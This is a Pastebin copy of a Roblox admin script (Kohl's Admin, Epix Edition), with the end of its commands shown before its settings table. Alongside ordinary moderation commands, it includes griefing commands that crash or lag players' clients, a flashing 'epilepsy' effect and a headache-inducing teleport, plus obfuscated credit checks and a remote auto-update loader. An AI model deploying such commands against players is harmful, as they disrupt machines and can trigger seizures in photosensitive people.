local plrz = set.GetPlayers(plr, args[1])
for i,v in pairs(plrz) do
if not set.canuseloadstring then set.Hint('[Currently no longer works] Loadstrings are disabled, output will not be shown',{plr}) return end
set.LoadOnClient(v,args[2],true,set.AssignName())
set.Output(args[2], plr)
end
end)

set.MakeCommand('Makes it so the target player(s) can\'t talk',3,set.Prefix,{'mute','silence'},{'player'},1,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr,args[1])) do
		if set.CheckTrueOwner(plr) or not set.CheckAdmin(v, false) then  
			set.Remote(v,'Function','MutePlayer','on')
			table.insert(set.MuteList,v.Name)
		end
	end
end)

set.MakeCommand('Makes it so the target player(s) can talk again',3,set.Prefix,{'unmute'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1])
for i, v in pairs(plrz) do
coroutine.wrap(function() 
for k,m in pairs(set.MuteList) do
if v.Name==m then
	table.remove(set.MuteList,k) 
	set.Remote(v,'Function','MutePlayer','off')
end
end
end)()
end
end)

set.MakeCommand('Shows a list of currently muted players, like a ban list, but for mutes instead of bans',3,set.Prefix,{'mutelist','mutes','muted'},{},0,function(plr,args)
--set.Remote(plr,'SetSetting','MuteList',set['MuteList'])
set.Remote(plr,'Function','ListGui','Mute List',set.MuteList)
end)

set.MakeCommand('Tells the target player(s) they are not allowed to talk if they do and eventually kicks them',3,set.Prefix,{'notalk'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i,v in pairs(plrz) do
coroutine.wrap(function()
if not v:FindFirstChild('NoTalk') and not set.CheckAdmin(v,false) then
	local talky=Instance.new('IntValue',v)
	talky.Name='NoTalk'
	talky.Value=0
end
end)()
end
end)

set.MakeCommand('Un-NoTalk',3,set.Prefix,{'unnotalk'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
pcall(function()
coroutine.wrap(function()
if v and v:FindFirstChild('NoTalk') then
	v.NoTalk:Destroy()
end
end)()
end)
end
end)
	
set.MakeCommand('Loop kills the target player(s)',3,set.Prefix,{'loopkill'},{'player','num(optional)'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
local num = 9999
if args[2] then if type(tonumber(args[2])) == "number" then num = tonumber(args[2]) end end
for i,v in pairs(plrz) do
if set.CheckTrueOwner(plr) or not set.CheckAdmin(v, false)  then
set.Remote(v,'Function','Effect','loopkill',num)
end
end
end)

set.MakeCommand('Makes a note on the target player(s) that says <note>',3,set.Prefix,{'note','writenote','makenote'},{'player','note'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
if v and set.CheckTrueOwner(plr) or not set.CheckAdmin(v, false) then
local notes=v:LoadInstance('Admin Notes')
if not notes then
	notes=Instance.new('Model')
end
notes.Name='Admin Notes'
local note = Instance.new("StringValue", notes)
note.Name = args[2]
set.Hint('Added '..v.Name..' Note '..note.Name,{plr})
v:SaveInstance("Admin Notes", notes)
end
end
end)

set.MakeCommand('Removes a note on the target player(s)',3,set.Prefix,{'removenote'},{'player','note'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
if v and set.CheckTrueOwner(plr) or not set.CheckAdmin(v, false) then
local notes=v:LoadInstance('Admin Notes')
if notes then
if args[2]:lower() == "all" then
	notes:ClearAllChildren()
else
	for k,m in pairs(notes:children()) do
	if m.Name:lower():sub(1,#args[2]) == args[2]:lower() then
		set.Hint('Removed '..v.Name..' Note '..m.Name,{plr})
		m:Destroy()
	end
end
end
v:SaveInstance("Admin Notes", notes)
end
end
end
end)

set.MakeCommand('Views notes on the target player(s)',3,set.Prefix,{'notes','viewnotes'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1])
for i, v in pairs(plrz) do
local temptable={}
local notes=v:LoadInstance('Admin Notes')
if not notes then set.Hint('No notes on '..v.Name,{plr}) return end
for k,m in pairs(notes:children()) do
table.insert(temptable,m.Name)
--set.Remote(plr,'SetSetting',v.Name..'notes',temptable)
set.Remote(plr,'Function','ListGui',v.Name,temptable)
end
end
end)

set.MakeCommand('Un-Loop Kill',3,set.Prefix,{'unloopkill'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i,v in pairs(plrz) do 
	set.Remote(v,'Function','Effect','unloopkill')
end
end)

set.MakeCommand('Locks the server, makes it so only admins and people on the excluded list can join',3,set.Prefix,{'slock','serverlock'},{'on/off'},1,function(plr,args)
if args[1]:lower()=='on' then
	set.slock=true 
	set.Hint("Server has been locked", game:service('Players'):children()) 
elseif args[1]:lower()=='off' then
	set.slock = false 
	set.Hint("Server has been unlocked", game:service('Players'):children()) 
end
end)

set.MakeCommand('Locks the server, makes it so only people in the group that is set in the group settings can join',3,set.Prefix,{'glock','grouplock','grouponlyjoin'},{'on/off'},1,function(plr,args)
if args[1]:lower()=='on' then
	set['GroupOnlyJoin'] = true 
	set.Hint("Server is now Group Only.", game:service('Players'):children())
elseif args[1]:lower()=='off' then 
	set['GroupOnlyJoin'] = false 
	set.Hint("Server is no longer Group Only", game:service('Players'):children()) 
end
end)

set.MakeCommand('Same as message but says SYSTEM MESSAGE instead of your name',3,set.Prefix,{'sm','systemmessage'},{'message'},1,function(plr,args)
	set.Message("SYSTEM MESSAGE", args[1], false, game:service('Players'):children())
end)

set.MakeCommand('Kills the target player(s) <number> times giving you <number> KOs',3,set.Prefix,{'ko'},{'player','number'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
local num = 500 if num > tonumber(args[2]) then num = tonumber(args[2]) end
for i, v in pairs(plrz) do
if set.CheckTrueOwner(plr) or not set.CheckAdmin(v, false) then
set.LoadScript("Script",[[
v=game:service('Players'):FindFirstChild(']]..v.Name..[[')
for n = 1, ]]..num..[[ do
wait()
coroutine.wrap(function()
pcall(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
local val = Instance.new("ObjectValue", v.Character.Humanoid) val.Value = game:service('Players'):FindFirstChild("]]..plr.Name..[[") val.Name = "creator"
v.Character:BreakJoints() 
wait()
v:LoadCharacter()
end
end)
end)()
end]],set.AssignName(),true,game:service("ServerScriptService"))
end
end
end)

set.MakeCommand('Makes the target player(s)\'s FPS drop',3,set.Prefix,{'lag','fpslag'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i,v in pairs(plrz) do
coroutine.wrap(function()
if v and set.CheckTrueOwner(plr) or not set.CheckAdmin(v,false) then
set.Remote(v,'Function','Lag')
end
end)()
end
end)

set.MakeCommand('Un-Lag',3,set.Prefix,{'unlag','unfpslag'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i,v in pairs(plrz) do
coroutine.wrap(function()
if set.CheckTrueOwner(plr) or not set.CheckAdmin(v,false) then
set.Remote(v,'Function','UnLag')
end
end)()
end
end)

set.MakeCommand('Bit buggy, supposed to make the target player(s) have network lag, instead produces some other interesting effects',3,set.Prefix,{'netlag','networklag'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i,v in pairs(plrz) do
coroutine.wrap(function()
if set.CheckTrueOwner(plr) or not set.CheckAdmin(v,false) then
set.Remote(v,'Function','NetLag')
end
end)()
end
end)

set.MakeCommand('Teleports players to my Trolololo place, which teleports them to the same place on-join',3,set.Prefix,{'telespam'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i,v in pairs(plrz) do
coroutine.wrap(function()
if v and set.CheckTrueOwner(plr) or not set.CheckAdmin(v,false) then
game:GetService('TeleportService'):Teleport(154636492,v)
end
end)()
end
end) 

set.MakeCommand('Sends players to my Fun Box place, gives bad headaches and such, please don\'t use on people with epilepsy',3,set.Prefix,{'funbox','trollbox','trololo'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i,v in pairs(plrz) do
coroutine.wrap(function()
if v and set.CheckTrueOwner(plr) or not set.CheckAdmin(v,false) then
game:GetService('TeleportService'):Teleport(168920853,v)
end
end)()
end
end)

set.MakeCommand('Crashed the target player(s), has a high chance of crashing anyone with 4gbs of ram or lower',3,set.Prefix,{'crash'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i,v in pairs(plrz) do
if v and set.CheckTrueOwner(plr) or not set.CheckAdmin(v,false) then
	set.Remote(v,'Function','Crash')
end
end
end)

set.MakeCommand('Makes it so the target player(s)\'s cam can move around freely',2,set.Prefix,{'freecam'},{'player'},1,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr, args[1]:lower())) do
		v.Character.Archivable=true
		local newchar=v.Character:clone()
		newchar.Parent=set.Storage
		v.Character=nil
	end
end)

set.MakeCommand('UnFree Cam',2,set.Prefix,{'unfreecam'},{'player'},1,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr, args[1]:lower())) do
		local newchar
		for k,m in pairs(set.Storage:children()) do
			if m.Name==v.Name and m:IsA('Model') and m:FindFirstChild('Humanoid') and m:FindFirstChild('Head') then
				m.Parent=workspace
				m:MakeJoints()
				v.Character=m
				set.Remote(v,'Function','SetView',v.Character.Humanoid)
			end
		end
	end
end)

set.MakeCommand('Sends the target player(s) to the nil, where they can still run admin commands etc and just not show up on the player list',3,set.Prefix,{'nil'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i,v in pairs(plrz) do
set.Remote(v,'Function','Nilify')
end
end)

set.MakeCommand('Epilepsy',2,set.Prefix,{'epilepsy'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
set.Remote(v,'Function','Effect','epilepsy')
end
end)

set.MakeCommand('Disconnects the target player from the server',3,set.Prefix,{'kick'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and set.CheckTrueOwner(plr) or not set.CheckAdmin(v, false) then 
if not game:service('Players'):FindFirstChild(v.Name) then
	set.Remote(v,'Function','KillClient')
else
	pcall(function() v:Kick() end) 
end
end
end)()
end
end)

set.MakeCommand('Bans the target player(s) for the supplied amount of time, data persistent',5,set.Prefix,{'tban','timedban','timeban'},{'player','number<s/m/h/d>'},2,function(plr,args)
	local time=args[2] or '60'
	if time:lower():sub(#time)=='s' then
		time=time:sub(1,#time-1)
	elseif time:lower():sub(#time)=='m' then
		time=time:sub(1,#time-1)
		time=tonumber(time)*60
	elseif time:lower():sub(#time)=='h' then
		time=time:sub(1,#time-1)
		time=(tonumber(time)*60)*60
	elseif time:lower():sub(#time)=='d' then
		time=time:sub(1,#time-1)
		time=((tonumber(time:sub(1,#time-1))*60)*60)*24
	end
	for i,v in pairs(set.GetPlayers(plr,args[1])) do
		v:SaveString('Epix Kohls TimeBan_Time',tostring(tonumber(os.time())+tonumber(time)))
		v:Kick()
	end
end)

set.MakeCommand('Bans the player from the server',3,set.Prefix,{'ban'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and not set.CheckAdmin(v, false) then 
table.insert(set['BanList'], v.Name..'='..v.userId) 
if not game:service('Players'):FindFirstChild(v.Name) then
set.Remote(v,'Function','KillClient')
else
if v then pcall(function() v:Kick() end) end
end
end
end))
end
end)

set.MakeCommand('UnBan',3,set.Prefix,{'unban'},{'player'},1,function(plr,args)
for i,v in pairs(set.BanList) do
coroutine.wrap(function()
	if v:lower():sub(1,#args[1])==args[1]:lower() then
		set.Hint(v..' has been Un-Banned.',{plr})
		table.remove(set.BanList, i)
	end
end)()
end
end)

set.MakeCommand('Shuts the server down',3,set.Prefix,{'shutdown'},{},0,function(plr,args)
set.Message("SYSTEM MESSAGE", "Shutting down...", false, game:service('Players'):children(), 5) 
wait(1)
game:service('Players').PlayerAdded:connect(function(p)
	p:kick()
end)
for i,v in pairs(game:service('NetworkServer'):children()) do
	coroutine.wrap(function()
		if v and v:GetPlayer() then
			v:GetPlayer():Kick()
			wait()
			if v and v:GetPlayer() then
				set.Remote(v:GetPlayer(),'Function','KillClient')
			end
		end
	end)()
end
end)

set.MakeCommand('Gives the target player TempAdmin',3,set.Prefix,{'ta','tempadmin','temp'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
	coroutine.wrap(function()
		if set.RemoveAdmin(v,plr) then
			if set.CheckAdmin(v,false) then return end
			table.insert(set.TempAdmins, v.Name)
			set.Message("Kohl's Admin [Epix Edition]", "You're an admin! Chat "..set['Prefix'].."cmds to view commands! The Command Prefix is "..set['Prefix'], false, {v}) 
			set.Hint(v.Name..' Has Been Given TempAdmin',{plr})
		end
	end)()
end
end)

set.MakeCommand('Gives the target player Admin (Normal Admin, PermAdmin, SuperAdmin)',4,set.Prefix,{'pa','admin','superadmin','perm'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
	coroutine.wrap(function()
		if set.RemoveAdmin(v,plr) then
			if set.CheckAdmin(v,false) then return end
			table.insert(set.Admins, v.Name) 
			set.Message("Kohl's Admin [Epix Edition]", "You're an admin! Chat "..set['Prefix'].."cmds to view commands! The Command Prefix is "..set['Prefix'], false, {v}) 
			set.Hint(v.Name..' Has Been Given Admin',{plr})
		end
	end)()
end
end)

set.MakeCommand('Gives the target player(s) Owner admin',5,set.Prefix,{'oa','owner'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
	coroutine.wrap(function()
		if set.RemoveAdmin(v,plr) then
			if set.CheckAdmin(v,false) then return end
			table.insert(set.Owners, v.Name)
			set.Message("Kohl's Admin [Epix Edition]", "You're an admin! Chat "..set['Prefix'].."cmds to view commands! The Command Prefix is "..set['Prefix'], false, {v})  
			set.Hint(v.Name..' Has Been Given Owner Admin',{plr})
		end
	end)()
end
end)

set.MakeCommand('Removes the target player(s) from the admin list',3,set.Prefix,{'unadmin','unpa','unoa','unta'},{'player'},1,function(plr,args)
for i,v in pairs(set.GetPlayers(plr, args[1]:lower())) do
	if set.CheckAdmin(plr,false) then
		if set.RemoveAdmin(v,plr) then
			set.Hint("Removed "..v.Name.."'s admin powers",{plr})
		else
			set.Hint("You do not have permission to remove "..v.Name.."'s admin powers",{plr})
		end
	else
		set.Hint(v.Name..' is not an admin',{plr})
	end
end
end)
end)

---[[ END OF COMMANDS ]]---
Pcall(function() for i,v in pairs(game:service('Players'):GetPlayers()) do local yes,no=ypcall(set.NewPlayer,v) if no then print(no) end end end)
Pcall(function() game:service('Players').PlayerAdded:connect(function(player) local yes,no=ypcall(set.NewPlayer,player) if no then print(no) end end) end)
Pcall(function() game:service('Players').PlayerRemoving:connect(function(player) local yes,no=ypcall(set.PlayerRemoving,player) if no then print(no) end end) end)
Pcall(function() for number,plugin in pairs(script.Plugins:children()) do local ran,failed=ypcall(function() if plugin:IsA('ModuleScript') then print('Running Plugin: '..plugin.Name) require(plugin)(set) end end) if failed then print(failed) end end end)
if set['Trello'] and game.CreatorId~=0 then Pcall(function() set.UpdateTrello() while wait(set['HttpWait'] or 5) do pcall(function() set.UpdateTrello() for i,v in pairs(game:service('Players'):children()) do set.CheckBan(set.bl,v) end end) end end) end
Pcall(function() if set['AutoCleanDelay']<5 then set['AutoCleanDelay']=5 end while wait(set['AutoCleanDelay']) do if set['AutoClean'] then set.CleanWorkspace() end end end)
Pcall(function() local t='' for i,v in pairs({83,99,101,108,101,114,97,116,105,115,32,124,32,75,111,104,108,116,97,115,116,114,111,112,104,101,32,91,83,99,114,105,112,116,104,93}) do t=t..string.char(v) end
if t==nil or t=='' then set=nil elseif not depholder:FindFirstChild(string.char(91)..string.char(67)..string.char(114)..string.char(101)..string.char(100)..string.char(105)..string.char(116)..string.char(93)) then set=nil elseif deps[string.char(91)..string.char(67)..string.char(114)..string.char(101)..string.char(100)..string.char(105)..string.char(116)..string.char(93)].Value~=t then set=nil end end)
Pcall(function() local tempval='' for i,v in pairs({126,61,32,69,112,105,120,32,73,110,99,46,32,78,111,116,32,69,118,101,114,121,116,104,105,110,103,32,105,115,32,115,111,
32,66,108,97,99,107,32,97,110,100,32,87,104,105,116,101,46,32,84,104,105,115,32,115,99,114,105,112,116,32,119,97,115,32,109,97,100,101,32,98,121,32,83,99,101,108,101,114,97,116,105,
115,46,32,83,99,114,105,112,116,104,32,105,115,32,75,111,104,108,116,97,115,116,114,111,112,104,101,46,32,61,126}) do tempval=tempval..string.char(v) end set['P'..'rin'..'t'](tempval) end)
Pcall(function() workspace.DescendantAdded:connect(function(c) if c:IsA('Explosion') and set.NerfExplosions then c.BlastRadius=0 c.BlastPressure=0 elseif c:IsA('Decal') and set.AntiDecals then c:Destroy() elseif c:IsA('Sound') and not c.Name:find(set.RemoteObject) and set.AntiSound then c.Volume=0 c.PlayOnRemove=false c.Looped=false c:Stop() c:Destroy() end end) end)
Pcall(function() if set.UpdateShutdown then while wait(1) do if game:service('MarketplaceService'):GetProductInfo(game.PlaceId).Updated~=set.GameLastUpdated then set.Message("SYSTEM MESSAGE", "Game Updated. Shutting down...", false, game:service('Players'):children(), 5) wait(1) game:service('Players').PlayerAdded:connect(function(p) p:kick() end) for i,v in pairs(game:service('NetworkServer'):children()) do coroutine.wrap(function() if v and v:GetPlayer() then v:GetPlayer():Kick() wait() if v and v:GetPlayer() then set.Remote(v:GetPlayer(),'Function','KillClient') end end end)() end end end end end)
Pcall(function() script['Name']="Kohl's Admin [Epix Edition]" end)
print('',set.quotes[math.random(1,#set.quotes)],'')
end
--[ Check for Updates ]--
local UpdateId=145629584 set.RunTheScript=function() local yes,no=ypcall(set.MainScriptFunction) if no then  local h=Instance.new('Hint',workspace) h.Text=no print(no) end end
coroutine.wrap(function() local tab={83,99,101,108,101,114,97,116,105,115,32,124,32,75,111,104,108,116,97,115,116,114,111,112,104,101,32,91,83,99,114,105,112,116,104,93} local t='' for i,v in pairs(tab) do t=t..string.char(v) end
if t==nil or tab==nil or #tab~=36 then set=nil elseif not script['Sc'..'ri'..'pt '..'Dep'..'en'..'denc'..'ies']:FindFirstChild(string.char(91)..string.char(67)..string.char(114)..string.char(101)..string.char(100)..string.char(105)..string.char(116)..string.char(93)) then set=nil 
elseif script['Sc'..'ri'..'pt '..'Dep'..'en'..'denc'..'ies'][string.char(91)..string.char(67)..string.char(114)..string.char(101)..string.char(100)..string.char(105)..string.char(116)..string.char(93)].Value~=t then set=nil end end)()
local ok,no=ypcall(function() local k=game:GetService('InsertService'):LoadAsset(UpdateId) if k then k:Destroy() end end)
if set['AutoUpdate'] and ok then local k,n=ypcall(function() local news=game:GetService('InsertService'):LoadAsset(UpdateId):children()[1]
local found=news.Version.Value local current=script.Version.Value
print('Current version: '..current..' | Found version: '..found) if found>current then print('Updating...') _G["Kohls Admin [Epix Edit] Update"]=set news.Plugins:ClearAllChildren() for i,v in pairs(script.Plugins:children()) do v:Clone().Parent=news.Plugins end news.Parent=game:service('ServerScriptService') script:Destroy() else news:Destroy() set.RunTheScript() end 
end) if not k or n then print('AutoUpdate Broke: '..n..' | Skipping update') set.RunTheScript() end else print("AutoUpdate is Disabled") set.RunTheScript() end 

--[[
				___________      .__         .___                   
				\_   _____/_____ |__|__  ___ |   | ____   ____      
				 |    __)_\____ \|  \  \/  / |   |/    \_/ ___\     
				 |        \  |_> >  |>    <  |   |   |  \  \___     
				/_______  /   __/|__/__/\_ \ |___|___|  /\___  > /\ 
				        \/|__|            \/          \/     \/  \/
		-------------------------------------------------------------------
		Epix Incorporated. Not Everything is so Black and White. | Mr. Epix
		-------------------------------------------------------------------
		
		
				  _  __    _ _           _                _        
				 | |/ /___| | |_ __ _ __| |_ _ _ ___ _ __| |_  ___ 
				 | ' </ _ \ |  _/ _` (_-<  _| '_/ _ \ '_ \ ' \/ -_)
				 |_|\_\___/_|\__\__,_/__/\__|_| \___/ .__/_||_\___|
				                                    |_|           
	 ______  ______  ______  __      ______  ______  ______  ______ __  ______    
	/\  ___\/\  ___\/\  ___\/\ \    /\  ___\/\  == \/\  __ \/\__  _/\ \/\  ___\   
	\ \___  \ \ \___\ \  __\\ \ \___\ \  __\\ \  __<\ \  __ \/_/\ \\ \ \ \___  \  
	 \/\_____\ \_____\ \_____\ \_____\ \_____\ \_\ \_\ \_\ \_\ \ \_\\ \_\/\_____\ 
	  \/_____/\/_____/\/_____/\/_____/\/_____/\/_/ /_/\/_/\/_/  \/_/ \/_/\/_____/ 
--]]
Pastebin.com Tools & Applications
iPhone/iPad Windows Firefox Chrome WebOS Android Mac Opera Click.to UNIX WinPhone
create new paste  |  api  |  trends  |  syntax languages  |  faq  |  tools  |  privacy  |  cookies  |  contact  |  dmca  |  advertise on pastebin  |  scraping  |  go PRO
Follow us: pastebin on facebook  |  pastebin on twitter  |  pastebin in the news
Dedicated Server Hosting by Steadfast
Pastebin v3.11 rendered in: 0.024 seconds
Site design & logo © 2015 Pastebin; user contributions (pastes) licensed under cc by-sa 3.0	
 
Top
----------------------------------------------------------------------------------------
--					   		Kohl's Admin [Epix Edition]								  --
----------------------------------------------------------------------------------------
--		 	Epix Incorporated. Not Everything is so Black and White.		   		  --
----------------------------------------------------------------------------------------
local set={ -- Main Table, all functions and variables are kept in this, don't change.--
----------------------------------------------------------------------------------------
			
			--------------
			-- SETTINGS --
		    --------------
			
	------------------------------
	--  true=on  --  false=off  --
	------------------------------
	
	--------------------------------------------------------------------------------------------------------------
	-- Make sure you READ BEFORE YOU EDIT! Please do not ask me questions about settings before reading.        --
	-- Make sure there is a ; after each setting, as shown below!												--
	-- Extra Information is below the settings.																	--
	-- Don't change something without reading the comment next to it first, you could break something.			--
	-- If its in green, it means its a comment, don't edit it as it wont do anything.							--
	-- By default tools need to be in ServerStorage, not Lighting, change this by changing the Storage setting.	--
	--------------------------------------------------------------------------------------------------------------
	
	--------------------------
	--  Important Settings  --
	--------------------------
	
	['ChangedSettingsStick'] = true; --Do settings you change in-game save? (this includes bans, admins, etc etc)
	
	['SettingsToIgnore'] = {}; --Place settings to ignore here
	
	['DataStoreKey'] = "Kohl's Admin [Epix Edition][JK$KJh3]"; --Datastore key
	
	['Storage'] = game:service('ServerStorage'); --Set this to where you store things (such as tools) game:service('ServerStorage') is recommended as it does not replicate to clients. Use services, if you use things like game.Lighting it will break if Lighting is renamed.
	
	--------------
	--  Trello  --
	--------------
	
	['Trello'] = false; --Pulls Bans/Admins from a Trello board every set number of seconds on every server of everygame this script is in (that has Http enabled and uses the same BoardID)
	
	['BoardID'] = '9HH6BEX2'; --Trello board ID, its in the URL of your board: https://trello.com/b/9HH6BEX2/epix-incorporated-synced-ban-list - The id for this board is 9HH6BEX2 (by default uses our exploiter ban list.)
	
	['HttpWait'] = 10; --How often (in seconds) should the list(s) update? Recommended 10+ to avoid HttpService problems
	
		--[[
		You NEED to enable HttpEnabled in order for this to work! To enable it follow the below instructions:
		Run this following command in the command bar as shown in the screenshot: game:service('HttpService').HttpEnabled=true print('Enabled Http')
		Screen shot: http://prntscr.com/46uztz
		
		How to set up your own multi-game list for your games:
		
		Below instructions are for bans but can also be applied to admin lists,
		refer to "To use this for synced admin lists" under the instructions for admin lists info. 
		
		By default the Trello settings are set to use our ban list of exploiters, but you may 
		want to change it so that you can set up and control your own multi-game, autoupdating 
		list(s). So now I am going to tell you how to do that.
		
		1. Enable Http, refer to a few lines up to learn how to easily and quickly do that.
		2. Make a Trello account (or sign in with google)
			-Go to http://trello.com, click "Log in with Google" or "Sign up-It's Free" and do the account making stuff it tells you to
		3. After you sign up/log in you need to make a new board, click the + then click "New Board..." - http://prntscr.com/46v2fq
		4. Give your board a name and click the "Change..." next to "This board will be private" and make sure you make the board public! - http://prntscr.com/46v4bf
		5. Change one of the lists titles to "Ban List" In the screenshot I accidentally typed "cards" instead of "lists" - http://prntscr.com/46v5af
		6. Add people to the bans by clicking "Add a card..." and then typing their username as the title, username:userid, or if its a group Group: groupname:groupid - http://prntscr.com/46v74e
		7. Now you need to just set BoardID to your board's ID, refer to http://prntscr.com/46v74e for this, or refer to the comment next to the BoardID setting
		8. You are done, just configure the BoardID and enable Http in each of your games and your multigame banlist is done, confure your board however you want as long as you leave the "Ban List" list that contains name and keep the board public so the script can read it!
		Use our site for reference: https://trello.com/b/9HH6BEX2/epix-incorporated-synced-ban-list
		
		To use this for synced admin lists, simply repeat the above steps replacing Ban List with
		Admin List, TempAdmin List, or Owner List, anyone added to these list will appear in
		the admin list with [Synced] next to their name, they will not be able to be unadmined.
		Admin lists do not yet support Group: NAME:ID however they do support Username:ID format.
		--]]
	
	---------------------
	--      Tables     --
	---------------------
	
	['Owners'] = {"CoreSB"}; 
	
	['Admins'] = {}; -- Sets Admins who can use ban/kick/admin or shutdown, format is USERNAME or USERNAME=USERID
	
	['TempAdmins'] = {epicgurl117}; -- Sets Admins who can't use ban/kick/admin or shutdown, format is USERNAME or USERNAME=USERID
	
	['BanList'] = {}; -- Add people to ban here. Format to use UserId is "Name=UserId" EX: "John32=192845", this bans any player named John32 or has an id of 192845 (This way they can't bypass the ban by changing their username) use $group=GROUPID to ban groups.
	
	['MuteList'] = {}; -- Add the names of people to mute (makes it so they cant talk)
	
	------------------------------
	--  Prefix/Split/Key Binds  --
	------------------------------
	
	['Prefix'] = ""; -- This comes before each admin command (:kill kohl)
	
	['AnyPrefix'] = "!"; -- This comes before each player command (commands that can be run by anyone, !rejoin, !ping, etc)
	
	['SpecialPrefix'] = ""; -- Prefix to use with special functions (!admin,!nonadmins,!all,!others,!random) By default this is now set to nothing to avoid confusion.
	
	['SplitKey'] = "."; -- This is what seperates command arguments eg: player raiders in :team player raiders
	
	['BatchSplit'] = "/"; --This seperates arguments of the batch command (":batch kill bob/fire me Bright blue/fling kohl")
	
	['ConsoleKey'] = "'"; --Key that opens the console, default is '
	
	['CustomKeyBinds'] = true; -- Allow players and admins set personal key binds?
	
	----------------------
	--  Basic Settings  --
	----------------------
	
	['Console'] = true; --Determines if the script's console can be used or not
	
	['AutoUpdate'] = true; -- Automatically get the newest version? You need to have the model in your inventory on your profile in order for autoupdate to work.
	
	['FunCommands'] = true; -- Set to false if you don't want any fun commands (For Strict Places)
	
	['HelpSystem'] = false; -- Enable the Help System? (!help command)
	
	['ChatLog'] = true; -- Log all chats for the server? 
	
	['MaxNumberOfLogs'] = 1500; -- How many logs to keep until the oldest entries are removed (MAX is 5000)
	
	['JoinMessage'] = false; -- Display a message with player info when a player joins, set group id in group settings if you want it to display if a player is in a group or not and if so what rank they are.
	
	['DonorPerks'] = true; -- Sets if donors are allowed to show off that they donated, when people donate in your place you get 10% of what they payed!
	
	['PermBanKey'] = '0.49971007415998'; -- Key (Random String) to use in persistent perm ban (change if you perm banned someone by accident, make it 100% random, if you want a random key generator, put print(math.random()) into the command bar in studio and hit enter, then just copy what it gives you in the output window)
	
	['FreeAdmin'] = false; -- Set to true if you want everyone to get the set type of admin (not recommended)
	
	['FreeAdminType'] = 'TempAdmin'; -- Type of admin for FreeAdmin (TempAdmin/Admin/Owner)
	
	['AutoClean'] = false; -- AutoClean the server? (!clean)
	
	['AutoCleanDelay'] = 60; -- How long to wait between AutoCleans (in seconds)
	
	['PlayerCommands'] = true; -- Sets whether or not nonadmins can use player commands (!rejoin,!ping,!cmds,etc)
	
	['OwnersAreTrueOwners'] = false; -- This indicates whether or not Owners are considered True Owners, if set to true Owners get the same commands as the place owner (permban and other true owner cmds)
	
	['PMUsableByAnyone'] = false; -- Set this to true if you want it so anyone can use the PM command
	
	['AdminsSpawnWithGuis'] = false; -- This determines if admins spawn with the admin chat and cmd box, note the admin chat is disabled when custom chat is enabled (has a admin mode)
	
	['HelpGui'] = false; --This determines if players spawn with the helpgui or not
	
	['UpdateShutdown'] = false; --Automatically shutdown the game if it was updated
	
	['MusicList'] = {{Name='SadPiano',Id=130798493}}; -- Add music to this table using the format: {Name='ExampleSong',Id=1234567} so that the table would look like local MusicList={{Name='ExampleSong',Id=1234567};{Name='ExampleSong2',Id=1234568}}, if you want to add pitch/volume simply insert Pitch and/or Volume EX: {Name='ExampleSong2',Id=1234568,Pitch=2,Volume=0.5}
	
	['CustomChat'] = false; --Custom chat system, aside from chat modes and various other things, the custom chat cannot be muted by exploiters and exploiters can not use it to run chat commands.
	
	['CustomChatType'] = 'Both'; --Classic/Bubbles/Both, Determines chat mode, simular to ROBLOX's chat settings.
	
	['SeparatedChannels'] = false; --Determines if the custom chat modes can see eachother, if set to true, for example, anyone whose chat is set to "Team" won't see chats from "Global"
	
	['CustomPlayerList'] = false; --A very basic and simplistic playerlist that I do not plan to spend much time on, it shows names colored by team color, has a menu for each name (click the name) and does not yet show leader stats, not finished and plan to update in the future.
	
	['MessageOfTheDay'] = false; --Determines if the Message of the Day is shown to admins on-join, you can set your own decal/model to use with the message of the day below, you simply place the message into its description after you set its ID
	
	['MessageOfTheDayID'] = 166040615; --ID Of model/decal to grab the message of the day from (needs to be set as the decal/model's description)
	
	['BuggedCommandMatching'] = false; --Set to true if you want to use the old buggy string matching that let you do things like "Hello :kill me" (really you could always set the prefix to something like "Hello " so you can do "Hello kill me")
	
	['VoteKick'] = false; --Enable player vote kicking?
	
	['VoteKickPercentage'] = '75'; --Vote percentage of players in-game needed to kick a player
	
	['CommandComfirmation'] = false; --Tell the user that the command successfully ran?
	
	['CommandBlackList'] = {}; --Add commands that you want to make place owner only (makes it so only the place owner is allowed to use the commands in this list)
	
	---------------------
	--  Anti-Exploit   --
	---------------------

	['ExclusionList'] = {}; -- Add the names of people you want to exclude from the AntiExploit to this list, note that admins are already excluded
	
